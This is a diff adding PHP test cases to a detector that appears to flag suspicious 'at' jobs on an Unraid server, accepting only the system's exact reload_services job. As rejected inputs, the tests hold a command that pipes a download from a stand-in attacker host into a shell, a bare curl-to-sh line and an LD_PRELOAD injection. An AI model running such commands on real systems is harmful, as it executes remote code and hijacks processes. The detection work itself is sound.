@@ -4020,6 +4020,15 @@ function testWatchmanAtUserScript(): void
     same('at user script: the launcher of an existing script (a name with ä, one with spaces; at with and without its SHELL wrapper)',
         ['temporäre_rsyncs_4', 'CKW Batch 2026', 'temporäre_rsyncs_4'],
         [$is($head() . $wrap($launch('temporäre_rsyncs_4'))), $is($head() . $wrap($launch('CKW Batch 2026'))), $is($head() . $launch('temporäre_rsyncs_4') . "\n")]);
+    $reload = "sleep 10; /usr/local/emhttp/webGui/scripts/reload_services";
+    same('at: Unraid\'s own reload_services after an array start — only exactly that, as root, with a clean environment', [true, false, false, false],
+        [watchmanAtUnraid($head() . $reload . "\n"), watchmanAtUnraid($head() . $reload . "; curl -s https://evil.example/x | sh\n"),
+         watchmanAtUnraid($head("LD_PRELOAD=/tmp/x\\.so; export LD_PRELOAD\n") . $reload . "\n"),
+         watchmanAtUnraid(str_replace('# atrun uid=0 ', '# atrun uid=1000 ', $head()) . $reload . "\n")]);
+    $ub = [watchmanEntry('at_job', 'at_job:=0000401c790e8', 100, ['cmd' => $reload, 'uid' => 0]), watchmanEntry('at_job', 'at_job:x', 100, ['cmd' => 'curl x | sh', 'uid' => 0])];
+    watchmanAtUnraidClose($ub, 200);
+    same('at: an open entry up to 1.30 that was only Unraid\'s job is closed (by unraid), others stay', [['unraid', 200], [null, null]],
+        [[$ub[0]['by'], $ub[0]['noted']], [$ub[1]['by'], $ub[1]['noted']]]);
     same('at user script: anything else is not', array_fill(0, 11, null), [
         $is($head() . $wrap($launch('temporäre_rsyncs_5'))),                                                         // no such script
         $is($head() . $wrap('/usr/local/emhttp/plugins/user.scripts/startBackground.php /tmp/evil/script')),        // not User Scripts' copy
